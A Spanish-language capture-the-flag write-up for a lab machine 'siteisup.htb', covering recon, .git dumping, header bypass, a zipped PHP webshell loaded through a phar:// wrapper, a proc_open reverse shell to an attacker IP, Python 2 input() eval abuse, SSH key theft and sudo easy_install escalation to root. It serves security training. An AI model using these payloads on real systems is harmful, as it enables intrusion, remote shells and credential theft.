#CPTS #Git #SubDomains #Cabecera #FileUpload #Zip #PHPWrapper


```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.49.90 -oG allPorts
```

```shell
nmap -p22,80 -sCV 10.129.49.90 -oN targeted  
```

Usaremos whatweb para ver que tecnologías utiliza
```shell
whatweb http://10.129.49.90
```

No encontramos mucha información
Ejecutaremos el script de nmap `http-enum` que hace la función de fuzer
```shell
nmap --script http-enum -p80 10.129.49.90 
```

Encontramos una salida potencial de un directorio llamado `/dev`
Al navegar a la web a través del navegador encontramos un nombre de dominio llamado *siteisup.htb* que añadiremos al `/etc/hosts`

La web en la que nos encontramos nos valida si la URL de la web que introduces esta activa en este momento o no, podemos levantarnos un servidor con python y comprobar si de verdad la función de la web funciona.
```shell
python3 -m http.server 80 
```

Y hacer la verificación en la web *siteisup.htb* dándonos como respuesta que el servicio que hemos levantado con python esta activo, para ver las cabeceras de la petición podemos ponernos en escucha con netcat
```shell
nc -nlvp 80
```

Obteniendo las cabeceras pero sin obtener mas información de la ya conocida
Ahora probaremos montando de nuevo el servidor http con python usando el modo debug que nos ofrece la web
```shell
python3 -m http.server 80 
```

Al usar este modo nos devuelve información sobre el servicio que esta publicado
Vamos a interceptar la petición con [[BURPSUITE]], con el modo debug habilitado
![[Pasted image 20260825124053.png]]

Probaremos cambiando el valor de *debug* cambiándolo de *1* a *0* por ejemplo
Al ponerlo en *1* nos muestra en la respuesta el *textarea* donde aparece la información del modo debug, cuando hacemos la petición a nuestro servidor

Si lo modificamos a *0* ese *textarea* no nos aparece
Probaremos también poniendo el valor en *2* y este nos vuelve a mostrar el *textarea* y modificando el valor a tres nos sucede exactamente lo mismo.

Si en la web probamos a concatenar una instrucción en caso de se este utilizando [[CURL]] a la hora de hacer la comprobación si el servidor esta levantado o no nos muestra un mensaje indicándonos *Hacking attempt was detected!*. La instrucción introducida es la siguiente
```shell
http://10.10.14.226; whomai
```

Por lo cual llegamos a la conclusión de que la inyección de comandos esta bien sanitizada

También conocemos el directorio `/dev` por lo cual podemos navegar a el, no nos muestra contenido pero sabemos que el directorio existe ya que al probar con otra combinación de caracteres nos muestra *Not Found* cosa que con `/dev` no

Podemos continuar haciendo fuzzing con [[NMAP]] volviendo a usar el script *http-enum* y con *--script-args* indicar a *http-enum* desde donde queremos que haga el fuzing
```shell
nmap --script http-enum -p80 --script-args http-enum.basepath='/dev' 10.129.49.90
```

Encontrando la ruta `/dev/.git`, navegaremos a el, siendo el contenido que vemos los recursos de un proyecto en *git*, para poder obtener los recursos del proyecto y poderlos visualizar hay una herramienta llamada [[GIT_DUMPER]].
```shell
git_dumper.py http://siteisup.htb/dev/.git/ ./project 
```

Encontramos un `admin.php` lo que nos da a entender que puede haber un directorio con ese nombre en la web, probamos en ella sin encontrar nada, lo cual puede significar que haya un subdominio que si que este utilizando ese `admin.php`

Así que vamos a proceder a enumerar subdominios usando ffuf
```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb -t 20
```

como nos devuelve muchos *200* filtraremos únicamente por el tamaño usando `-fs 1131` en búsqueda de coincidencias
```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb/ -t 20 -fs 1131
```

Encontrando el subdominio `dev` el cual deberemos de añadir a `/etc/host` para poder acceder y resolver en el navegador y poder acceder a ella a través de `http://dev.siteisup.htb`

Respondiéndonos un *Forbiden*, buscaremos recursos ocultos de nuevo en el proyecto de github que hemos obtenido anteriormente.
Podemos leer un `.htacces` que es donde se controla el acceso a determinados archivos del proyecto.
Se esta aplicando una política en la cual deniega el acceso a todo el mundo al no ser que cuentes con una cabecera llamada *Special-Dev* con el valor de *only4dev*
![[Pasted image 20260825182945.png]]

Ahora añadiremos a la cabecera dentro de la petición usando Burpsuite
En las opciones del proxy en Burpsuite buscare *HTTP Match and Replace* y añadiremos una nueva regla. En *Type* tendremos que poner *Request Header* y en *Replace* la cabecera a incorporar
![[Pasted image 20260825183404.png]]

Ahora al interceptar una petición se nos añadiría automáticamente la cabecera de la regla que hemos creado:
![[Pasted image 20260825183514.png]]

Si dejamos que la petición continúe su trafico después de ser interceptada y modificada vemos que la web `dev.siteisup.htb` ha variado su contenido teniendo ahora aun botón al *Amdin Panel* y una opción de subida de ficheros para validar si una lista de webs están levantadas.

Como temeos un campo de subida de archivo vamos a probar a crearnos un archivo llamado `cmd.php` para subirlo y ver como interacciona la web con el.
En el script vamos a crear un script que nos permita ejecutar comandos
```php
<?php
 echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

El script lo que hace es lo siguiente:
- Utiliza etiquetas preformateadas para mantener el formato del texto intacto por parte del navegador
- Con *shell_exec* ejecuta el texto como comando de sistema devolviendo su salida
- Y el parámetro *$_GET* lee el parámetro *cmd* directamente desde la URL

Habiendo así construido una webshell con php
Ahora lo subiremos al servidor y obtendremos como respuesta que la extensión no es permitida.

Buscaremos mas información en los recursos del proyecto en busca de algo que nos pueda aportar mas información sobre la web.
Podemos leer el `change.log` en el cual nos indica varios puntos
![[Pasted image 20260825185616.png]]

Habla sobre eliminar la opción de subida de archivos y esto puede deberse a que haya que eliminarla por que esta este mal configurada o sea vulnerable por algún motivo.

Encontramos tambien un archivo llamdo `checker.php` el cual es el codigo fuente de la web que contiene la subida de archivos y en el encontramos donde tramita la subida de archivos y como la tramita
![[Pasted image 20260825185927.png]]

- Archivos menores a 10Kb
- Extensiones no permitidas *php|html|py|pl|phtml|zip|rar|gz|gzip|tar*
- Una vez tramitada la subida se envía al directorio *uploads*

Ahora vamos a cambiar la extensión del fichero a `.pht` que no esta contemplada en las restricciones

Al subirlo y mirar si este se encuentra en el directorio `uploads` no lo ubicamos por lo cual volvemos a mirar en el archivo de configuración por si algún casual a la hora de subir el archivo este lo borra y nos encontramos con lo siguiente
![[Pasted image 20260825191921.png]]

Lo que nos confirma que el archivo nos lo borra una vez subido.
También podemos mirar el fichero llamado `index.php` en este archivo lo primero que pone en la parte superior *Only for developers*
![[Pasted image 20260826120552.png]]

Vemos que para apuntar al recurso de el *Admin Panel*, utiliza el recurso `?page=admin`, además vemos que esta sanitizado la entrada de este parámetro evitando entradas como `/bin, /usr, /home, /var, /etc`, además a cualquier parámetro que introduzcas se le hace un `include` de la extensión `.php`.

Lo que podemos hacer es a la hora de hacer la consulta hacia `?page=admin` nos esta concatenando al final de la consulta el `.php`, accediendo a la ruta con un botón que te lleva al *Admin Panel*.
Pero en vez de hacer la consulta de esa forma lo que podemos hacer es un wraper que lo codifique en *base64*, y así no interprete el código php y te lo mostraría en *base64*
```php
?page=php://filter/convert.base64-encode/resource=admin
```

Por lo cual ahora por pantalla no muestra el script en *base64*, del archivo `admin.php` ya que concatena después de `admin` la extensión `.php`
```base64
PD9waHAKI0VtcHR5IGZvciBub3cuCj8+
```

Lo decodeamos el *base64*
```shell
echo -n 'PD9waHAKI0VtcHR5IGZvciBub3cuCj8+' | base64 -d; echo
```

Dándonos como resultado el código `php` del `admin.php`
```php
<?php
#Empty for now.
?>
```

También sabemos que tenemos el archivo `index` así que vamos a hacer la enumeración del código igual que hemos hecho con `admin`
```php
?page=php://filter/convert.base64-encode/resource=index
```

Decodeamos de nuevo el *base64*
```shell
echo -n 'PGI+VGhpcyBpcyBvbmx5IGZvciBkZXZlbG9wZXJzPC9iPgo8YnI+CjxhIGhyZWY9Ij9wYWdlPWFkbWluIj5BZG1pbiBQYW5lbDwvYT4KPD9waHAKCWRlZmluZSgiRElSRUNUQUNDRVNTIixmYWxzZSk7CgkkcGFnZT0kX0dFVFsncGFnZSddOwoJaWYoJHBhZ2UgJiYgIXByZWdfbWF0Y2goIi9iaW58dXNyfGhvbWV8dmFyfGV0Yy9pIiwkcGFnZSkpewoJCWluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSAuICIucGhwIik7Cgl9ZWxzZXsKCQlpbmNsdWRlKCJjaGVja2VyLnBocCIpOwoJfQkKPz4K' | base64 -d; echo
```

Obteniendo el mismo contenido que ya conocíamos del `index.php`
Sabemos que existe el directorio `/uploads` que parte directamente desde la raíz del servicio web.
Podemos emplear otros wrapers, por ejemplo si al apuntar con el parámetro `?page=` a `uploads/` lo que haremos seria meternos al directorio `uploads`

Como hemos visto anteriormente lo único que valida es que no acedamos a los directorios indicados en el `index.php`
Además también hemos visto en el `checker.php` que este elimina el archivo al finalizar el código, así que tenemos que buscar la forma de hacer que este código no llegue al final y no elimine el archivo causando un error.

Primero en el `cmd.php` lo que haremos será comprimirlo para que los caracteres no sean legibles
```shell
zip cmd.zip cmd.php
```

Pero la extensión `.zip` esta capada en el checker, así que para que nos lo tire atrás al inicio cambiaremos el nombre de la extensión, y lo cargaremos en búsqueda de causar algún error.
```shell
mv cmd.zip cmd.pwned
```

Cargamos el archivo `.pwned` en la web y vemos en `uploads` que este se queda almacenado
![[Pasted image 20260826181450.png]]

 Al la web tener un parámetro como es el caso de `?page=` se nos da la posibilidad de apuntar a un archivo, por lo que podemos hacer es utilizar el wraper *php* llamado `phar` el cual nos permite acceder directamente al recurso interno del zip el que aloja el `cmd.php`, pero como la web ya de por si te concatena la extensión no hace falta indicarla
 ```php
 ?page=phar://uploads/137579c0ef0a2dd72cdd9630ab05aa88/cmd.pwned/cmd
 ```

 Como no vemos ningún cambio diferente en la web al intentar acceder al recurso podemos crear un archivo nuevo *php* para ver si interpreta el código mostrando un *Hola* en la respuesta
 ```php
 <?php
  echo "Hola";
 ?>
 ```

Lo haremos un zip igual que antes y le cambiaremos el nombre de la extensión a este y lo cargaremos a la web y usaremos el wraper
```php
?page=phar://uploads/c039f7babbe6ab9d4836ecc8089b5b41/test.pwned/test
```

Observamos que si se refleja la respuesta en la web.
Ahora validares las funciones que están habilitadas a la hora de interpretar código y cuales no para poder facilitarnos a la hora de poder ejecutar nuestro código en la web, usaremos el siguiente script en *php* para enumerarlas.
 ```php
 <?php
  phpinfo();
 ?>
 ```

Volveremos a comprimir el archivo, cambiarle el nombre de extensión, subirlo, y acceder a el a través del wraper.
```php
?page=phar://uploads/521c43f41930ff0c7767ca15f2cd19e8/test.pwned/test
```

Obteniendo el *phpinfo*, pudiendo ver todas las funciones que están deshabilitadas
![[Pasted image 20260826183109.png]]

Usaremos una herramienta llamada *dfunc-bypasser*, la cual pasándole cómo argumento un URL la cual contenga un *phpinfo* te dice que funciones no están contempladas que te permitan ejecutar comandos
`https://github.com/teambi0s/dfunc-bypasser.git`

Pero como ya hemos configurado anterior mente en Burpsuite, tenemos que introducir una cabecera especial para poder llegar a ver ese *phpinfo*, así que deberemos de modificar la tool, para que tramite las peticiones con la cabecera adecuada
![[Pasted image 20260826184026.png]]

Volveremos a cargar el archivo del *phpinfo* y le pasamos la URL a la herramienta
```shell
dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/6efa841f20458709d7263614ce1eb387/test.pwned/test
```

Devolviéndonos como resultado que falta la función `proc_open` de la cual nos podremos aprovechar para la ejecución remota de comandos.
Así que buscaremos en internet como poder entablarnos una reverse shell aprovechándonos de esta función.
Encontramos una reverse shell en Github
```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("file", "/tmp/error-output.txt", "a") 
);

$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.226/443 0>&1'";

$process = proc_open($shell, $descriptorspec, $pipes);

?>
```

Tendremos que modificar la IP y el puerto.
A continuación lo comprimimos de nuevo, cambiamos la extensión y lo subimos.
```php
?page=phar://uploads/5d9cb91d6c3837c9cc454654bb2016ff/cmd.pwned/cmd
```

Nos pondremos en escucha en el puerto indicado y recibiremos una reverse shell
```shell
nc -nlvp 443
```

En la shell que hemos recibido somos `www-data`
Lo primero que deberemos de hacer es un tratamiento de la shell para poder operar en una tty
```shell
script /dev/null -c bash
```
```shell
crtl + z
```
```shell
stty raw -echo; fg 
```
```shell
reset xterm
```
```shell
export TERM=xterm
```
```shell
export SHELL=/bin/bash
```

Ajustaremos filas y columnas
```shell
stty rows 49 columns 236
```

Si navegamos a `/home` nos encontramos con un usuario llamado `developer` en el cual se encuentra la flag de usuario pero no la podemos leer por falta de permisos lo cual quiere decir que tendremos que escalar a el.

También se encuentra en su usuario un directorio llamado `/dev`, en el cual se encuentran varios binarios con usuario `developer` y grupo `www-data` con permisos *SUID*, se nos permite ejecutarlo ya que los grupos tienen esa capacidad de ejecución
![[Pasted image 20260826190831.png]]

Pudiendo ejecutarlo de forma temporal como el usuario `developer`
![[Pasted image 20260826190852.png]]

Podemos listar los caracteres legibles del binario usando
```shell
string siteisub
```

Encontrando que ejecuta con python un archivo llamado `siteisup_test.py`
![[Pasted image 20260826191126.png]]

Podemos ver que hace ese script ya que se encuentra en nuestro mismo directorio
```shell
cat siteisup_test.py ; echo
```

![[Pasted image 20260826191317.png]]

Se encarga de tramitar una petición por *GET* a una URL indicada en el binario de `siteisup`
Al ver que es un archivo `.py` podemos ver que versión de *python* esta utilizando, por que al haber un `input` depende de la versión este puede ser vulnerable
```shell
python --version
```

Obteniendo como resultado *Python 2.7.17*, en la cual navegando por internet vemos que nos podemos aprovechar del input
`https://stackoverflow.com/questions/4960208/python-2-7-getting-user-input-and-manipulating-as-string-without-quotations`

Este `input` lo que hace en *Python2* es llamar a `eval()` lo que nos permite cargar instrucciones que hagan llamadas al sistema.

Lo que tendremos que hacer es ejecutar el archivo `siteisup_test.py`
```shell
python2 siteisup_test.py
```

![[Pasted image 20260826192345.png]]

En el `input` que nos pide al jugar por detrás con un `eval()` por lo cual podemos realizar ejecuciones de comando a nivel de sistema
```python
__import__('os').system('id')
```

Conseguimos que nos muestre la información que requerimos
![[Pasted image 20260826192638.png]]

También lo podemos ejecutar directamente sobre el binario principal y ejecutar una bash en la petición
```python
__import__('os').system('bash -p')
```

Obteniendo una shell como el ususario `developer`
![[Pasted image 20260826192843.png]]

Pero al hacer un `id` nos damos cuenta que seguimos perteneciendo al grupo `www-data`
![[Pasted image 20260826193005.png]]

Lo solventaremos accediendo a la ruta de `.ssh` nos copiamos el `id_rsa` y desde nuestra maquina atacante nos conectaremos median ssh directamente al usuario sin arrastrar el grupo anterior de `www-data`
Deberemos darle de permisos `600` a la clave privada y podremos acceder mediante ssh
```shell
ssh -i id_rsa developer@10.129.227.227
```

Ahora podremos obtener la flag del user

Para la escalada de privilegios a root miraremos que permisos tenemos como el usuario sudo usando
```shell
sudo -l
```

Viendo que podemos correr como root `/usr/local/bin/easy_install`
Este es un script the python
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Navegaremos a *GTFObins* para ver si este binario tiene explotación.
Vemos que si que contiene una explotación conocida así que la explotaremos

Este binario es parte de *setuptools* que permite ejecutar código arbitrario *Python* mediante un script `setup.py` en el directorio actual.

Crearemos primero el script malicioso
```shell
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > setup.py
```

Y escalaremos a root
```shell
sudo easy_install .
```

Obteniendo la flag de root


